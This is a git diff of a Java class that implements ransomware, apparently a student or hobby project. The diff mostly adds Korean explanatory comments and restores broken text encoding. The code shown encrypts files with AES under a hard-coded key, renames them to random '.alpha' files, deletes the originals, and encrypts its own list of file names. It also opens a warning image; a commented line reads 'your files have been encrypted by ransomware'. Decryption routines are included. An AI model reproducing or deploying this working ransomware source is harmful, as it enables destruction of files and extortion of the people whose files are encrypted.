@@ -51,15 +51,18 @@ public class Cip implements CipInterface {
 //    private static final String KEY = "ZZHHYYTTUUHHGGRR";
 //    private static final String IV = "AAACCCDDDYYUURRS";
     
-
-	public void CreateKey() { // ����Ű �� ����Ű ����
+	// 공개키 및 개인키 생성
+	public void CreateKey() { 
 		try {
+			// 개인키
 			String KEY = "123456789abcdefg";
+			// 공개키
 			SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), "AES");
 			
 			this.key = secretKeySpec; 
-			URL url=getClass().getClassLoader().getResource("img/ڸ��.png");
-//			File r = new File("ڸ��.png");
+			// 실행 되면 사용자의 뷰어로 보여줄 이미지 경로
+			URL url=getClass().getClassLoader().getResource("img/美希.png");
+//			File r = new File("美希.png");
 			File r =Paths.get(url.toURI()).toFile();
 		    Desktop dt = Desktop.getDesktop();
 		    dt.open(r);
@@ -72,21 +75,6 @@ public class Cip implements CipInterface {
 		
 		
 	}
-	
-	
-//	public static void AESEncryption(byte[] target,  String filename) throws Exception{   
-//	  
-//	     
-//	     Cipher cipher = Cipher.getInstance("AES");     
-//	     SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(),"AES");
-//	     cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);      
-//	     byte[] encryptBytes = cipher.doFinal(target);
-//	    
-//	     CreateFile(aesfilepath,filename,encryptBytes);
-//	  
-//	     
-//	     
-//		}
 	
 	public static void CreateFile(String filepath, String filename, byte[] str) {
 		new File(filepath + filename);
@@ -142,6 +130,7 @@ public class Cip implements CipInterface {
 		}
 	}
 	
+	// 경고 메세지를 알려주기 위한 부분
 	public boolean CreateReadFile(String filepath, String filename) {
 //		BufferedWriter bw;
 		File f= new File(filepath + filename);
@@ -154,21 +143,19 @@ public class Cip implements CipInterface {
 			
 		}
 		try {
-//			bw = new BufferedWriter(new FileWriter(f));
-//			URL url=getClass().getClassLoader().getResource("/img/ڸ��.png");
-//			File r = new File("ڸ��.png");
+
 			try {
 				r =Paths.get(url.toURI()).toFile();
 			} catch (URISyntaxException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
-
+			// 랜섬웨어 당했음을 알려주기 위한 메세지
 		  	FileWriter fis = new FileWriter(warning);
 		  	File origin_name = new File("warning.jpg");
 		  	BufferedImage buffer_original_image = ImageIO.read(r);
 		  	ImageIO.write(buffer_original_image, "jpg",warning);
-//			bw.write("����� ������ ������� ���� ��ȣȭ �Ǿ����ϴ�.");
+//			bw.write("당신의 파일은 랜섬웨어에 의해 암호화 되었습니다.");
 //			bw.newLine();
 		} catch (IOException e) {
 			e.printStackTrace();
@@ -176,39 +163,39 @@ public class Cip implements CipInterface {
 		return true;
 	}
 
+	// 파일 암호화 하는 부분
 	public void FileEncrypt(String filepath, String filename) {
 		// TODO Auto-generated method stub
 		try {
-
-//			byte[] bytesOfKey = key.getBytes("UTF-8");				
-//			MessageDigest md = MessageDigest.getInstance("MD5");
-//			byte[] keyBytes = md.digest(bytesOfKey);
-		
-		
-//			final byte[] ivBytes = IV.getBytes();
-		
-//			SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
+			// AES/ECB 방식으로 암호화
+			// Java는 PKCS5, PKCS7를 구분하지 않는다.
 			Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+
+			// 어떤 형식으로 암호화 시킬 것인지, 키가 무엇인지 저장한다.
 			cipher.init(Cipher.ENCRYPT_MODE, key);
 		
 			String inFile = filepath + filename;
+			// 암호화 된 파일을 무작위 이름으로 확장자는 alpha라는 이름으로 저장한다.
 			String outFilename = CreateFileName(filepath, filename) + ".alpha";
 		
 			File f = new File(inFile);
 		
 			if(!f.isFile()) return;
 			
+			// 리스트에 원본 파일이 어떤 파일이름들로 암호화 시켰는지 기록한다/
 			FileOutputStream out = new FileOutputStream(filepath + outFilename);
-
+			
 			byte[] buffer = new byte[1024];
             int read = -1;
             
             InputStream input = new BufferedInputStream(new FileInputStream(f));
             OutputStream output = new BufferedOutputStream(out);
             try {
+				// 1024바이트씩 암호화 시킨다.
             	while ((read = input.read(buffer)) != -1) {
             		output.write(cipher.update(buffer, 0, read));
             	}
+				// 남은 바이트도 암호화 시킨다.
             	output.write(cipher.doFinal());
             } finally {
             	if (output != null) {
@@ -223,22 +210,20 @@ public class Cip implements CipInterface {
             		}
             	}
             }
-            
+            // 암호화 끝난 후 원본 파일 삭제
             if (f.delete())
-				System.out.println("�����Ϸ�1");
+				System.out.println("삭제완료1");
 			else
-				System.out.println("��������1");
+				System.out.println("삭제실패1");
 		} 
 		catch (Exception e) {
-//			e.printStackTrace();
+			e.printStackTrace();
 		}
-	
-		
-}
+	}
 
+	// 무작위 파일 이름을 생성한다.
 	private String CreateFileName(String filepath, String filename) {
 		// TODO Auto-generated method stub
-		
 		String uniqueFileName = getUniqueFileName();
 		boolean flag = doCheckFileExists(filepath + uniqueFileName + ".alpha");
 		while (flag) {
@@ -247,74 +232,49 @@ public class Cip implements CipInterface {
 		}
 		list.put(uniqueFileName, filename);
 		return uniqueFileName;
-		
 	}
 
+	// 파일이 존재하는지 확인
 	private boolean doCheckFileExists(String fullPath) {
 		// TODO Auto-generated method stub
 		return new File(fullPath).exists();
 	}
 
+	// 무작위 파일 이름을 생성한다.
 	private String getUniqueFileName() {
 		// TODO Auto-generated method stub
 		return UUID.randomUUID().toString();
 	}
 
+	// 파일 복호화
 	public void FileDecryte(String filepath, String filename) {
-		// TODO Auto-generated method stub
-//		byte[] bytesOfKey = null;
-//		MessageDigest md = null;
-//		
-//		try {
-//			bytesOfKey = key.getBytes("UTF-8");
-//			md = MessageDigest.getInstance("MD5");
-//		} catch (NoSuchAlgorithmException e1) {
-//			// TODO Auto-generated catch block
-//			e1.printStackTrace();
-//		} catch (UnsupportedEncodingException e) {
-//			// TODO Auto-generated catch block
-//			e.printStackTrace();
-//		}
-//        byte[] keyBytes = md.digest(bytesOfKey);
-//        
-//        final byte[] kBytes = key.getBytes();
-//
-//        final byte[] encryptedBytes;
-//        
-//        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
-//        
-//        final byte[] ivBytes = IV.getBytes();
 		
 		Cipher cipher;
 		try {
+			// AES/ECB 형식으로 복호화 시킨다.
 			cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
 			cipher.init(Cipher.DECRYPT_MODE, key);
 
 			String inFile = filepath + filename;
 			String outFilename = filename;
-//			System.out.print(b);
 			File f = new File(inFile);
 			
-	//		if(!f.isFile()) return;
-//			System.out.println(outFilename.substring(0, (outFilename.length() - 6)));
-//			if(list.get(outFilename.substring(0, (outFilename.length() - 6)))==null)
-//				return;
-			outFilename = list.get(outFilename.substring(0, (outFilename.length() - 6))); //
-//			System.out.println(inFile+"////////"+outFilename);
+			// 리스트에서 암호화 시킨 파일들 리스트를 가져오고 확장자를 떼낸다.
+			outFilename = list.get(outFilename.substring(0, (outFilename.length() - 6)));
+
 			int pos = outFilename.lastIndexOf("."); 
 			String ext = outFilename.substring(pos + 1);
 
-			
+			// 1024바이트씩 암호화 시켰으니 1024바이트씩 다시 복호화 시킨다.
 			byte[] buffer = new byte[1024];
 			int read = -1;
 			
-//			FileOutputStream out = new FileOutputStream(filepath + outFilename);
-//            InputStream input = new BufferedInputStream(new FileInputStream(f));
-//            OutputStream output = new BufferedOutputStream(out);
 			File of = new File(filepath+outFilename);
 			InputStream input = new BufferedInputStream(new FileInputStream(f));
 			OutputStream output = new BufferedOutputStream(new FileOutputStream(of));
-            try {
+            
+			// 파일을 복호화 시키는 부분
+			try {
                 	while ((read = input.read(buffer)) != -1) {
                 		output.write(cipher.update(buffer, 0, read));
                 	}
@@ -336,25 +296,25 @@ public class Cip implements CipInterface {
             input.close();
 			output.close();
 
+			// 복호화 시킨 다음에는 암호화 되었던 파일들을 삭제한다.
 			f.delete();
-//			if( (outFilename.substring(0, (outFilename.length() - 5)).contentEquals("alpha")) )
-//				;
+
 			return;
 		} catch (InvalidKeyException e) {
 			// TODO Auto-generated catch block
-//			e.printStackTrace();
+			e.printStackTrace();
 		} catch (NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
-//			e.printStackTrace();
+			e.printStackTrace();
 		} catch (NoSuchPaddingException e) {
 			// TODO Auto-generated catch block
-//			e.printStackTrace();
+			e.printStackTrace();
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
-//			e.printStackTrace();
+			e.printStackTrace();
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
-//			e.printStackTrace();
+			e.printStackTrace();
 		}
 		
 	}
@@ -364,10 +324,10 @@ public class Cip implements CipInterface {
 		return list;
 	}
 
+	// 저장된 리스트 파일로부터 키 값을 읽어온다.
 	public void ReadListFile(String filepath) {
 		// TODO Auto-generated method stub
 		try {
-
 			BufferedReader bw;
 
 			bw = new BufferedReader(new FileReader(new File(filepath + "list")));
@@ -377,8 +337,7 @@ public class Cip implements CipInterface {
 
 			while((key = bw.readLine())!=null) {
 				value = (bw.readLine());
-//				System.out.println("��Ʈ"+key);
-//				System.out.println(value);		
+
 				newlist.put(key,value);
 			}
 			list = newlist;
@@ -386,7 +345,6 @@ public class Cip implements CipInterface {
 //				System.out.println(ke+"    "+newlist.get(ke));
 			}
 			bw.close(); 
-//			System.out.print("�̰� ����ƺ"+list);
 		}
 		catch (IOException e) {
 			// TODO Auto-generated catch block
@@ -394,9 +352,9 @@ public class Cip implements CipInterface {
 		}
 	}
 
+	// 암호화가 끝났으면 리스트 파일도 암호화 시킨다.
 	public void ListEncrypt(String filepath, String filename) {
 		// TODO Auto-generated method stub
-		
 		try {
 
 //			byte[] bytesOfKey = key.getBytes("UTF-8");				
@@ -449,9 +407,9 @@ public class Cip implements CipInterface {
 			in.close();
 					
 			if (f.delete())
-				System.out.println("�����Ϸ�2");
+				System.out.println("삭제완료2");
 			else
-				System.out.println("��������");
+				System.out.println("삭제실패");
 					
 
 		} catch (Exception e) {
@@ -459,7 +417,7 @@ public class Cip implements CipInterface {
 		}
 	}
 
-
+	// 복호화 시킬때 리스트를 읽어오기 위해 리스트를 복호화 시킨다.
 	public void ListDecryte(String filepath, String filename) {
 		// TODO Auto-generated method stub
 		
